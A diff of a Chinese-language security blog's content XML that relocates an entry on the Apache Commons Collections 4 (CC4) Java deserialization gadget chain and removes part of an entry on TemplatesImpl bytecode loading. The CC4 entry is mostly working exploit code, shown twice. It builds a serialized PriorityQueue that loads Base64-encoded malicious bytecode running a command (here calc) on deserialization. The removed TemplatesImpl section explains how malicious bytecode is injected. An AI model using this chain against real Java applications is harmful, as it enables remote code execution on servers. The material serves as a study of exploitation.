@@ -938,235 +938,6 @@ https://xz.aliyun.com/t/9409
       </tags>
   </entry>
   <entry>
-    <title>5、CC4</title>
-    <url>/2023/08/22/5%E3%80%81CC4/</url>
-    <content><![CDATA[# CC4
-## 利用版本
-jdk8（这里用的jdk8u201） &&  Commons-Collections 4（除了4.0都能用）
-## CC4 Demo
-```
-package Apache_Common_Collections.cc_1_7;
-
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
-
-import org.apache.commons.collections4.Transformer;
-import org.apache.commons.collections4.comparators.TransformingComparator;
-import org.apache.commons.collections4.functors.ChainedTransformer;
-import org.apache.commons.collections4.functors.ConstantTransformer;
-import org.apache.commons.collections4.functors.InstantiateTransformer;
-
-import javax.xml.transform.Templates;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
-import java.lang.reflect.Field;
-import java.util.PriorityQueue;
-
-//与cc2类似
-//InvokeTransformer 变为 InstantiateTransformer
-public class CommonsCollections4 {
-
-    public static void main(String[] args) {
-
-        try{
-            //字节码
-            byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
-
-            //反射设置 Field
-            TemplatesImpl templates = new TemplatesImpl();
-            setFieldValue(templates, "_bytecodes", new byte[][]{code});
-            setFieldValue(templates, "_name", "HelloTemplatesImpl");
-            setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());
-
-            //Transformer数组
-            Transformer[] transformers = new Transformer[] {
-                    new ConstantTransformer(TrAXFilter.class),
-                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
-            };
-
-
-            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
-
-            //TransformingComparator 实例
-            TransformingComparator comparator = new TransformingComparator(chainedTransformer);
-
-            //PriorityQueue 实例
-            PriorityQueue priorityQueue = new PriorityQueue(2);
-            //先设置为正常变量值，后面可以通过setFieldValue修改
-            priorityQueue.add(1);
-            priorityQueue.add(1);
-
-            //反射设置 Field
-            Object[] objects = new Object[]{templates, templates};
-            setFieldValue(priorityQueue, "queue", objects);
-            setFieldValue(priorityQueue, "comparator", comparator);
-
-            //序列化
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            ObjectOutputStream oos = new ObjectOutputStream(baos);
-            oos.writeObject(priorityQueue);
-            oos.flush();
-            oos.close();
-
-            //测试反序列化
-            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
-            ObjectInputStream ois = new ObjectInputStream(bais);
-            ois.readObject();
-            ois.close();
-
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-
-    }
-
-
-    //反射设置 Field
-    public static void setFieldValue(Object object, String fieldName, Object value) {
-        try {
-            Field field = object.getClass().getDeclaredField(fieldName);
-            field.setAccessible(true);
-            field.set(object, value);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-}
-
-```
-## 相比其他CC链
-在CommonsCollections4系列中，除4.0版本，其他版本InvokerTransformer类都没有实现Serializable接口 ，导致无法序列化，所以这里就是在CC2的基础上使用InstantiateTransformer替换了InvokerTransformer
-
-## 分析
-代码与CC1、CC2、CC3有重合，这里就不画蛇添足了
-
-## 完整代码
-```
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
-import com.sun.org.apache.xml.internal.security.utils.Base64;
-import org.apache.commons.collections4.Transformer;
-import org.apache.commons.collections4.comparators.TransformingComparator;
-import org.apache.commons.collections4.functors.ChainedTransformer;
-import org.apache.commons.collections4.functors.ConstantTransformer;
-import org.apache.commons.collections4.functors.InstantiateTransformer;
-
-import javax.xml.transform.Templates;
-import java.io.*;
-import java.lang.reflect.Field;
-import java.util.PriorityQueue;
-
-public class CommonsCollections4 {
-
-    //用于反射调用成员变量并赋值
-    public static void setValue(Object object, String fieldName, Object fieldValue) {
-        try {
-            Field field = object.getClass().getDeclaredField(fieldName);
-            field.setAccessible(true);
-            field.set(object,fieldValue);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-
-    public static void main(String[] args) throws Exception{
-        byte[] code = Base64.decode("yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
-        TemplatesImpl templates = new TemplatesImpl();
-        setValue(templates,"_name","test111");
-        setValue(templates,"_bytecodes", new byte[][]{code});
-        setValue(templates,"_tfactory", new TransformerFactoryImpl());
-
-        //Transformer数组
-        Transformer[] transformers = new Transformer[] {
-                new ConstantTransformer(TrAXFilter.class),
-                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
-        };
-
-        //ChainedTransformer实例
-        Transformer chainedTransformer = new ChainedTransformer(transformers);
-
-        //TransformingComparator实例，并将InvokerTransformer封装进去
-        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
-
-        //获取PriorityQueue实例
-        PriorityQueue priorityQueue = new PriorityQueue();
-        priorityQueue.add(1);
-        priorityQueue.add(2);
-
-        //PriorityQueue实例的成员变量赋值
-        Object[] objects = new Object[]{templates,templates};
-        setValue(priorityQueue,"queue",objects);
-        setValue(priorityQueue,"comparator",transformingComparator);
-
-        //序列化
-        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa23.ser");
-        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
-        xlh.writeObject(priorityQueue);
-        xlh.close();
-        fileOutputStream.close();
-
-        //反序列化
-        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa23.ser");
-        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
-        fxlh.readObject();
-        fxlh.close();
-
-    }
-
-}
-
-```
-效果:
-
-![](https://s3.hedgedoc.org/demo/uploads/8072c067-f5b1-4039-8cab-ca24c5e287e2.png)
-
-报错，但是不影响我弹计算器
-
-## 学习
-https://xz.aliyun.com/t/9409
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>java安全</category>
-      </categories>
-      <tags>
-        <tag>利用链</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>4、CC2</title>
     <url>/2023/08/22/4%E3%80%81CC2/</url>
     <content><![CDATA[# CC2
@@ -1442,6 +1213,235 @@ https://xz.aliyun.com/t/9409
       </tags>
   </entry>
   <entry>
+    <title>5、CC4</title>
+    <url>/2023/08/22/5%E3%80%81CC4/</url>
+    <content><![CDATA[# CC4
+## 利用版本
+jdk8（这里用的jdk8u201） &&  Commons-Collections 4（除了4.0都能用）
+## CC4 Demo
+```
+package Apache_Common_Collections.cc_1_7;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
+
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+
+import javax.xml.transform.Templates;
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+//与cc2类似
+//InvokeTransformer 变为 InstantiateTransformer
+public class CommonsCollections4 {
+
+    public static void main(String[] args) {
+
+        try{
+            //字节码
+            byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
+
+            //反射设置 Field
+            TemplatesImpl templates = new TemplatesImpl();
+            setFieldValue(templates, "_bytecodes", new byte[][]{code});
+            setFieldValue(templates, "_name", "HelloTemplatesImpl");
+            setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());
+
+            //Transformer数组
+            Transformer[] transformers = new Transformer[] {
+                    new ConstantTransformer(TrAXFilter.class),
+                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
+            };
+
+
+            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+            //TransformingComparator 实例
+            TransformingComparator comparator = new TransformingComparator(chainedTransformer);
+
+            //PriorityQueue 实例
+            PriorityQueue priorityQueue = new PriorityQueue(2);
+            //先设置为正常变量值，后面可以通过setFieldValue修改
+            priorityQueue.add(1);
+            priorityQueue.add(1);
+
+            //反射设置 Field
+            Object[] objects = new Object[]{templates, templates};
+            setFieldValue(priorityQueue, "queue", objects);
+            setFieldValue(priorityQueue, "comparator", comparator);
+
+            //序列化
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(baos);
+            oos.writeObject(priorityQueue);
+            oos.flush();
+            oos.close();
+
+            //测试反序列化
+            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
+            ObjectInputStream ois = new ObjectInputStream(bais);
+            ois.readObject();
+            ois.close();
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+    }
+
+
+    //反射设置 Field
+    public static void setFieldValue(Object object, String fieldName, Object value) {
+        try {
+            Field field = object.getClass().getDeclaredField(fieldName);
+            field.setAccessible(true);
+            field.set(object, value);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+}
+
+```
+## 相比其他CC链
+在CommonsCollections4系列中，除4.0版本，其他版本InvokerTransformer类都没有实现Serializable接口 ，导致无法序列化，所以这里就是在CC2的基础上使用InstantiateTransformer替换了InvokerTransformer
+
+## 分析
+代码与CC1、CC2、CC3有重合，这里就不画蛇添足了
+
+## 完整代码
+```
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xml.internal.security.utils.Base64;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+public class CommonsCollections4 {
+
+    //用于反射调用成员变量并赋值
+    public static void setValue(Object object, String fieldName, Object fieldValue) {
+        try {
+            Field field = object.getClass().getDeclaredField(fieldName);
+            field.setAccessible(true);
+            field.set(object,fieldValue);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void main(String[] args) throws Exception{
+        byte[] code = Base64.decode("yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAGTHRlc3Q7AQANU3RhY2tNYXBUYWJsZQcAKwcAKQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJdGVzdC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEABHRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAJAAQACwANAA4AEAAMABEADQAVAA8ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGQANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");
+        TemplatesImpl templates = new TemplatesImpl();
+        setValue(templates,"_name","test111");
+        setValue(templates,"_bytecodes", new byte[][]{code});
+        setValue(templates,"_tfactory", new TransformerFactoryImpl());
+
+        //Transformer数组
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
+        };
+
+        //ChainedTransformer实例
+        Transformer chainedTransformer = new ChainedTransformer(transformers);
+
+        //TransformingComparator实例，并将InvokerTransformer封装进去
+        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
+
+        //获取PriorityQueue实例
+        PriorityQueue priorityQueue = new PriorityQueue();
+        priorityQueue.add(1);
+        priorityQueue.add(2);
+
+        //PriorityQueue实例的成员变量赋值
+        Object[] objects = new Object[]{templates,templates};
+        setValue(priorityQueue,"queue",objects);
+        setValue(priorityQueue,"comparator",transformingComparator);
+
+        //序列化
+        FileOutputStream fileOutputStream = new FileOutputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa23.ser");
+        ObjectOutputStream xlh = new ObjectOutputStream(fileOutputStream);
+        xlh.writeObject(priorityQueue);
+        xlh.close();
+        fileOutputStream.close();
+
+        //反序列化
+        FileInputStream fileInputStream = new FileInputStream("C:\\Users\\18249\\Desktop\\bypass\\xlh\\aa23.ser");
+        ObjectInputStream fxlh = new ObjectInputStream(fileInputStream);
+        fxlh.readObject();
+        fxlh.close();
+
+    }
+
+}
+
+```
+效果:
+
+![](https://s3.hedgedoc.org/demo/uploads/8072c067-f5b1-4039-8cab-ca24c5e287e2.png)
+
+报错，但是不影响我弹计算器
+
+## 学习
+https://xz.aliyun.com/t/9409
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>java安全</category>
+      </categories>
+      <tags>
+        <tag>利用链</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>6、CC5</title>
     <url>/2023/08/22/6%E3%80%81CC5/</url>
     <content><![CDATA[# CC5
@@ -1652,141 +1652,6 @@ https://xz.aliyun.com/t/9409
       </categories>
       <tags>
         <tag>利用链</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>TemplatesImpl</title>
-    <url>/2023/08/22/TemplatesImpl/</url>
-    <content><![CDATA[# TemplatesImpl
-## 简述
-TemplatesImpl这个类不在 Apache Commons Collections 中。但是 TemplatesImpl 这个类很特殊，我们可以借助其动态加载包含恶意的字节码
-## 分析
-### TemplatesImpl.newTransformer()方法
-主要是用来实例化一个TemplatesImpl对象，调用了getTransletInstance()方法，我们跟进
-
-![](https://s3.hedgedoc.org/demo/uploads/422d6e9e-a987-45d2-9db6-d10af1c9e695.png)
-
- ### TemplatesImpl.getTransletInstance()方法
-1. 如果_name=null，就直接返回null，所以_name不能为空
-2. 如果_class为null，就去调用defineTransletClasses()方法
-3. 然后实例化
-
-这里调用了defineTransletClasses()方法，我们跟进
-
-![](https://s3.hedgedoc.org/demo/uploads/4f49f77b-7f62-4c23-9593-971b7d98d28a.png)
-
-### TemplatesImpl.defineTransletClasses()方法
-1. 实例化一个TransletClassLoader对象loader，其中调用了_tfactory.getExternalExtensionsMap()，_tfactory肯定不能为空
-2. 调用defineClass()加载_bytecodes
-3. 
-这里调用了TransletClassLoader类，我们跟进
-
-![](https://s3.hedgedoc.org/demo/uploads/56df4873-c66d-489d-ac76-5a32a1f4fc01.png)
-
-### TemplatesImpl.TransletClassLoader类
-其实是TemplatesImpl的一个内部类，它继承ClassLoader父类，重写了defineClass方法
-
-![](https://s3.hedgedoc.org/demo/uploads/da1503f2-f80f-477a-aeb7-29ec31ca8849.png)
-
-### 小结
-实例化TemplatesImpl对象，需要给下面的几个成员变量赋值
-1. _bytecodes	byte[]对象，字节码，自己定义
-2. _name		String对象，类名，随便
-3. _tfactory		TransformerFactoryImpl对象，new一个
-
-## 测试
-首先准备恶意test类，用于获取恶意字节码
-恶意类必须继承AbstractTranslet类
-
-```
-import com.sun.org.apache.xalan.internal.xsltc.DOM;
-import com.sun.org.apache.xalan.internal.xsltc.TransletException;
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
-
